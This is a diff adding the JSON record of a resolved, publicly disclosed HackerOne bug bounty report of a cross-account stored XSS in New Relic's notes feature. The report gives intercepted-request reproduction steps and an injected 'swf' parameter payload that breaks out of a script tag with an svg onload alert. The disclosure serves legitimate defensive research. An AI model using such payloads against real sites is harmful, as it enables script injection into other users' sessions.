@@ -1,0 +1,138 @@
+{
+  "id": 710535,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MTA1MzU=",
+  "url": "https://hackerone.com/reports/710535",
+  "title": "Cross-account stored XSS at notes (through \"swf\" note parameter)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-10-09T14:11:30.911Z",
+  "submitted_at": "2019-10-09T14:11:30.911Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-13T11:05:56.055Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-11T09:34:07.422Z",
+  "team_member_agreed_on_going_public_at": "2020-08-13T11:05:55.959Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey team,\n\nI've found one more stored XSS, this one is inside a note. Since notes could be published to be available for any NR user **(cross-accountly), the impact is quite severe**. You can see the publicly-available payload here:\nhttps://rpm.newrelic.com/public/notes/4qovMmDXV7P\n{F603334}\n\n##Steps to reproduce\n1) Sign into NR\n2) Navigate to some app (APM,mobile,etc.)\n3) Choose any chart that can be embed into a note, click `Add to note`, then click `Save and close`, intercept the request with Burp Suite, it is like the following:\n```http\nPOST /accounts/2385914/notes?agent_id=173790664 HTTP/1.1\nHost: rpm.newrelic.com\n<redacted>\n\nutf8=%E2%9C%93&authenticity_token=ebHrvqEzOZ9Aj%2BffyB6%2FoAOPe7ecrKlb7kyTJVeO7HY%3D&app_name=newapp&note_item%5Bswf%5D=&note_item%5Bbegin_time%5D=2019-10-08T07%3A00%3A45-07%3A00&note_item%5Bend_time%5D=2019-10-09T07%3A00%3A45-07%3A00&note_item%5Btitle%5D=Apdex+score&note_item%5Bdata_url%5D=%2Fchart_data%2Fbase_charts%2Fcombined_apdex_rainbow.json%3Faccount_id%3D2385914%26agent%3D173790664%26application_id%3D173790664%26chartBottomMargin%3D55%26chart_type%3DMSLine%26current_product%3Dapm_product%26hideXAxisLabels%3Dtrue%26include_metric_guids%255B%255D%3D5b224170646578225d%26include_metric_guids%255B%255D%3D5b22456e64557365722f4170646578225d%26labelStep%3D3%26live%3Dtrue%26no_click%3Dfalse%26number_suffix%3D%26omit_markers%3Dtrue%26render_to%3Dcurrent_apdex_score_173790664%26title%3D%26tooltipGroup%3Dcurrent_charts%26tw%255Bdur%255D%3Dlast_24_hours%26tw%255Bend%255D%3D1570629645%26zoom%3Dtrue%26no_click%3D1%26no_links%3D1&note_item%5Bcontext_url%5D=%2Faccounts%2F2385914%2Fapplications%2F173790664%3Ftw%255Bdur%255D%3Dlast_24_hours&note_item%5Bnote_text%5D=&note_action=create&note_id=6621&action_after=save_and_close\n```\n4) Add the following parameter to the intercepted request (you can add it after all other parameters, for instance):\n```\n&note_item%5Bswf%5D=</script><svg/onload=alert(document.domain)>\n```\n5) Server response contains created note ID, navigate to this note:\nhttps://rpm.newrelic.com/accounts/<ACC_ID>/notes/<NOTE_ID>\nand make sure the payload is executed\n6) Inspect the page source and make sure the payload is injected inside the following script:\n```html\n<script type=\"text/javascript\">\n      jQuery(function($) {\n        var chart_options = {\"swf\":\"</script><svg/onload=alert(document.domain)>WorldwithCountries\",\"width\":\"100%\",\"height\":200,\"fluid\":true,\"snappable\":false,\"loadingOverlay\":true,\"render\":true};\n        chart_options.dataUrl = '/accounts/2385914/notes/6625/items/19898/chart_data?tw%5Bdur%5D=last_24_hours&tw%5Bend%5D=1570629645';\n        $('#div_chart_note_item_19898_chart').chart(chart_options);\n      });\n    </script>\n```\n7) You can also publish this note and make sure that the payload is active also at public note version.\n\n##PoC video:\n{F603345}\n\n## Impact\n\nCross-account active stored XSS",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 603334,
+      "file_name": "______________2019-10-09___16.59.54.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2gbeEporRvv2brQxZKgQibM4?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-09___16.59.54.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-09___16.59.54.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132921Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=77e3185ff89cb94d8023aab113c5bea439c46bbcc58fe1cbb499e356d5577ba2",
+      "file_size": 296241,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 603345,
+      "file_name": "nr_notes_xss.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7iZTxBahzcTb1hoS1ie2gTjP?response-content-disposition=attachment%3B%20filename%3D%22nr_notes_xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27nr_notes_xss.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132921Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ac5f2603d724c1b0ddcfe1eb4a29ffe6a1d0fc3ddef4b9bf9ef69118ecc2d1a",
+      "file_size": 21818891,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-10T09:34:07.456Z",
+  "allow_singular_disclosure_after": -108100513.75127491,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "wi11",
+    "ali",
+    "cryptographer",
+    "pkhadka",
+    "vangogh001",
+    "hackerxbella",
+    "meispi",
+    "mr0bart",
+    "036467383637",
+    "thanseer",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18678,
+    "asset_type": "URL",
+    "asset_identifier": "rpm.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
